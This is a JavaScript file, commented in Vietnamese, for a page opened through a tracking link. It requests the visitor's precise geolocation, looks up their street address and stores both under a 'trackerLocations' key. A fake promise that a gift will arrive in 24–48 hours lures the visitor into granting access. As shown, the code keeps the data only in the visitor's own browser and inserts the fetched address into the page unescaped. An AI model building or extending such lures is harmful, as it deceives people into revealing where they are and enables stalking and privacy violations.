// DOM Elements
const statusMessage = document.getElementById('status-message');
const locationDetails = document.getElementById('locationDetails');
const shareLocationBtn = document.getElementById('shareLocation');

// Lấy ID của link từ URL
function getLinkIdFromUrl() {
    const urlParams = new URLSearchParams(window.location.search);
    return urlParams.get('id');
}

// Hiển thị thông báo
function showMessage(message, isError = false) {
    statusMessage.textContent = message;
    statusMessage.className = isError ? 'error' : 'success';
}

// Lấy địa chỉ từ tọa độ (Reverse Geocoding)
async function getAddressFromCoords(latitude, longitude) {
    try {
        const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&zoom=18&addressdetails=1`);
        const data = await response.json();
        return data.display_name || 'Không thể xác định địa chỉ';
    } catch (error) {
        console.error('Lỗi khi lấy địa chỉ:', error);
        return null;
    }
}

// Lưu vị trí vào localStorage
async function saveLocation(position, linkId) {
    // Định dạng dữ liệu vị trí
    const locationData = {
        linkId: linkId,
        latitude: position.coords.latitude,
        longitude: position.coords.longitude,
        accuracy: Math.round(position.coords.accuracy),
        timestamp: new Date().toISOString()
    };
    
    // Thêm địa chỉ nếu có thể
    try {
        const address = await getAddressFromCoords(position.coords.latitude, position.coords.longitude);
        if (address) {
            locationData.address = address;
        }
    } catch (error) {
        console.error('Không thể lấy địa chỉ:', error);
    }
    
    // Lấy danh sách vị trí đã lưu
    const savedLocations = JSON.parse(localStorage.getItem('trackerLocations')) || [];
    
    // Thêm vị trí mới
    savedLocations.push(locationData);
    
    // Lưu vào localStorage
    localStorage.setItem('trackerLocations', JSON.stringify(savedLocations));
    
    return locationData;
}

// Hiển thị thông tin vị trí
function displayLocationInfo(locationData) {
    const mapLink = `https://www.google.com/maps?q=${locationData.latitude},${locationData.longitude}`;
    
    locationDetails.innerHTML = `
        <p><strong>Vĩ độ:</strong> ${locationData.latitude}</p>
        <p><strong>Kinh độ:</strong> ${locationData.longitude}</p>
        <p><strong>Độ chính xác:</strong> ${locationData.accuracy} mét</p>
        ${locationData.address ? `<p><strong>Địa chỉ:</strong> ${locationData.address}</p>` : ''}
        <p>
            <a href="${mapLink}" target="_blank" class="map-link">Xem trên Google Maps</a>
        </p>
        <div class="success-message">
            <p>✓ Thông tin của bạn đã được xác nhận!</p>
            <p>Bạn sẽ nhận được quà trong vòng 24-48 giờ tới.</p>
        </div>
    `;
}

// Xử lý lấy vị trí
async function getLocation() {
    const linkId = getLinkIdFromUrl();
    
    if (!linkId) {
        showMessage('Link không hợp lệ', true);
        return;
    }
    
    // Kiểm tra xem trình duyệt có hỗ trợ Geolocation không
    if (!navigator.geolocation) {
        showMessage('Trình duyệt của bạn không hỗ trợ Geolocation', true);
        return;
    }
    
    showMessage('Đang xác định vị trí của bạn...');
    
    // Lấy vị trí
    navigator.geolocation.getCurrentPosition(
        async (position) => {
            try {
                const locationData = await saveLocation(position, linkId);
                displayLocationInfo(locationData);
                showMessage('Vị trí của bạn đã được xác định thành công!');
            } catch (error) {
                console.error('Lỗi khi lưu vị trí:', error);
                showMessage('Đã xảy ra lỗi khi lưu vị trí của bạn', true);
            }
        },
        (error) => {
            let errorMessage = 'Không thể xác định vị trí của bạn';
            
            switch(error.code) {
                case error.PERMISSION_DENIED:
                    errorMessage = 'Bạn đã từ chối quyền truy cập vị trí';
                    break;
                case error.POSITION_UNAVAILABLE:
                    errorMessage = 'Thông tin vị trí không khả dụng';
                    break;
                case error.TIMEOUT:
                    errorMessage = 'Yêu cầu vị trí đã hết thời gian chờ';
                    break;
            }
            
            showMessage(errorMessage, true);
        },
        {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0
        }
    );
}

// Xử lý sự kiện khi nhấn nút chia sẻ vị trí
shareLocationBtn.addEventListener('click', getLocation); 